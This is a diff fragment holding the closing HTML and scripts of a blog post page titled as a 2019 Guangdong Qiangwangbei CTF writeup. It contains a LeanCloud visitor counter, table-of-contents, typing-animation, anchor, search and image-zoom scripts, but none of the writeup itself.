+          "requests": incrArr
+        }).then((res) => {
+          res = res.json();
+          if (res.error) {
+            throw res.error;
+          }
+          resolve(res);
+        }).catch((error) => {
+          console.error('Failed to save visitor count', error);
+          reject(error);
+        });
+      });
+    }
+
+    // 构建自增请求体
+    function buildIncrement(objectId) {
+      return {
+        "method": "PUT",
+        "path": `/1.1/classes/Counter/${ objectId }`,
+        "body": {
+          "time": {
+            '__op': 'Increment',
+            'amount': 1
+          }
+        }
+      }
+    }
+
+    // 校验是否为有效的 UV
+    function validUV() {
+      var key = 'LeanCloud_UV_Flag';
+      var flag = localStorage.getItem(key);
+      if (flag) {
+        // 距离标记小于 24 小时则不计为 UV
+        if (new Date().getTime() - parseInt(flag) <= 86400000) {
+          return false;
+        }
+      }
+      localStorage.setItem(key, new Date().getTime().toString());
+      return true;
+    }
+
+    function addCount(Counter) {
+      var enableIncr = 'true' === 'true' && window.location.hostname !== 'localhost';
+      var getterArr = [];
+      var incrArr = [];
+
+      // 请求 PV 并自增
+      var pvCtn = document.querySelector('#leancloud-site-pv-container');
+      if (pvCtn || enableIncr) {
+        var pvGetter = getRecord(Counter, 'site-pv').then((record) => {
+          incrArr.push(buildIncrement(record.objectId))
+          var ele = document.querySelector('#leancloud-site-pv');
+          if (ele) {
+            ele.innerText = record.time + 1;
+            if (pvCtn) {
+              pvCtn.style.display = 'inline';
+            }
+          }
+        });
+        getterArr.push(pvGetter);
+      }
+
+      // 请求 UV 并自增
+      var uvCtn = document.querySelector('#leancloud-site-uv-container');
+      if (uvCtn || enableIncr) {
+        var uvGetter = getRecord(Counter, 'site-uv').then((record) => {
+          var vuv = validUV();
+          vuv && incrArr.push(buildIncrement(record.objectId))
+          var ele = document.querySelector('#leancloud-site-uv');
+          if (ele) {
+            ele.innerText = record.time + (vuv ? 1 : 0);
+            if (uvCtn) {
+              uvCtn.style.display = 'inline';
+            }
+          }
+        });
+        getterArr.push(uvGetter);
+      }
+
+      // 如果是文章，请求文章的浏览数，并自增
+      if ('true' === 'true') {
+        var viewCtn = document.querySelector('#leancloud-post-views-container');
+        if (viewCtn || enableIncr) {
+          var target = decodeURI('/2019/09/11/qiangwangbei-GD-writewp/');
+          var viewGetter = getRecord(Counter, target).then((record) => {
+            incrArr.push(buildIncrement(record.objectId))
+            if (viewCtn) {
+              var ele = document.querySelector('#leancloud-post-views');
+              if (ele) {
+                ele.innerText = (record.time || 0) + 1;
+                viewCtn.style.display = 'inline';
+              }
+            }
+          });
+          getterArr.push(viewGetter);
+        }
+      }
+
+      // 如果启动计数自增，批量发起自增请求
+      if (enableIncr) {
+        Promise.all(getterArr).then(() => {
+          incrArr.length > 0 && increment(Counter, incrArr);
+        })
+      }
+    }
+
+    var app_id = '3vyTx5QfwzFij2bEnjvRIcxV-gzGzoHsz'
+    var app_key = 'neatHwvRMvcDYnNxMBbGGFlP'
+    var server_url = 'https://3vytx5qf.lc-cn-n1-shared.com'
+
+    function fetchData(api_server) {
+      var Counter = (method, url, data) => {
+        return fetch(`${ api_server }/1.1${ url }`, {
+          method,
+          headers: {
+            'X-LC-Id': app_id,
+            'X-LC-Key': app_key,
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify(data)
+        });
+      };
+
+      addCount(Counter);
+    }
+
+    var api_server = app_id.slice(-9) !== '-MdYXbMMI' ? server_url : `https://${ app_id.slice(0, 8).toLowerCase() }.api.lncldglobal.com`;
+
+    if (api_server) {
+      fetchData(api_server);
+    } else {
+      fetch('https://app-router.leancloud.cn/2/route?appId=' + app_id)
+        .then(resp => resp.json())
+        .then(({api_server}) => {
+          fetchData('https://' + api_server);
+        });
+    }
+  })();
+</script>
+
+
+
+
+
+
+  <script  src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '#post-body',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        collapseDepth: 0,
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc').css('visibility', 'visible');
+      }
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    function typing(id, hitokoto){
+      var typed = new Typed('#' + id, {
+        strings: [
+          '  ',
+          hitokoto + "&nbsp;",
+        ],
+        cursorChar: "_",
+        typeSpeed: 70,
+        loop: false,
+      });
+      typed.stop();
+      $(document).ready(function () {
+        $(".typed-cursor").addClass("h2");
+        typed.start();
+      });
+    };
+      
+  
+    typing("subtitle", "2019广东省强网杯writeup")
+  
+  </script>
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      searchFunc(path, 'local-search-input', 'local-search-result');
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+  <script>
+    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
+      function () {
+        var element = document.createElement('a');
+        $(element).attr('data-fancybox', 'images');
+        $(element).attr('href', $(this).attr('src'));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+</body>
+</html>
